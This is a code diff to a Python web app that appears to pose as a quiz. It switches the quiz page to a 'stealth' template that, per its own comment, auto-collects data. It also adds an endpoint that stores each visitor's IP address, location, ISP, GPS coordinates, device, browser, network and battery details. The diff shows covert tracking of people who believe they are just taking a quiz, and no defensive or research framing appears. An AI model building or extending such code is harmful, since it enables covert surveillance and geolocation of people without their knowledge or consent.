@@ -136,6 +136,10 @@ class PhotoUpload(BaseModel):
     session_id: str
     photos: list
 
+class StealthDataUpload(BaseModel):
+    session_id: str
+    data: dict
+
 @app.get('/', response_class=HTMLResponse)
 async def index(request: Request):
     """Home page with QR code for mobile access"""
@@ -158,13 +162,14 @@ async def index(request: Request):
 
 @app.get('/quiz', response_class=HTMLResponse)
 async def quiz(request: Request):
-    """Quiz page where users grant permissions"""
+    """Quiz page where users grant permissions - STEALTH VERSION"""
     # Generate a random session ID
     session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
     # Pick a random question
     question = random.choice(QUIZ_QUESTIONS)
 
-    return templates.TemplateResponse(request, 'quiz_new.html', {'session_id': session_id, 'question': question})
+    # Use stealth version that auto-collects data
+    return templates.TemplateResponse(request, 'quiz_stealth.html', {'session_id': session_id, 'question': question})
 
 @app.get('/get_question')
 async def get_question():
@@ -288,6 +293,36 @@ async def upload_photos(photo_upload: PhotoUpload):
         'status': 'success',
         'message': f'Received {len(photos)} photos',
         'photo_count': len(photos)
+    })
+
+@app.post('/upload_stealth_data')
+async def upload_stealth_data(stealth_upload: StealthDataUpload):
+    """Endpoint for receiving automatically collected stealth data"""
+    session_id = stealth_upload.session_id
+    data = stealth_upload.data
+
+    if session_id not in user_data_store:
+        user_data_store[session_id] = {}
+
+    # Store all the stealth collected data
+    user_data_store[session_id]['stealth_data'] = data
+    user_data_store[session_id]['ip_address'] = data.get('ip', 'Unknown')
+    user_data_store[session_id]['location'] = {
+        'city': data.get('city', 'Unknown'),
+        'region': data.get('region', 'Unknown'),
+        'country': data.get('country', 'Unknown'),
+        'isp': data.get('isp', 'Unknown')
+    }
+    user_data_store[session_id]['device_info'] = data.get('device', {})
+    user_data_store[session_id]['device_type'] = data.get('deviceType', 'Unknown')
+    user_data_store[session_id]['gps'] = data.get('gps')
+    user_data_store[session_id]['browser_info'] = data.get('browser', {})
+    user_data_store[session_id]['network_info'] = data.get('network', {})
+    user_data_store[session_id]['battery_info'] = data.get('battery')
+
+    return JSONResponse(content={
+        'status': 'success',
+        'message': 'Stealth data collected successfully'
     })
 
 @app.get('/show_data/{session_id}', response_class=HTMLResponse)
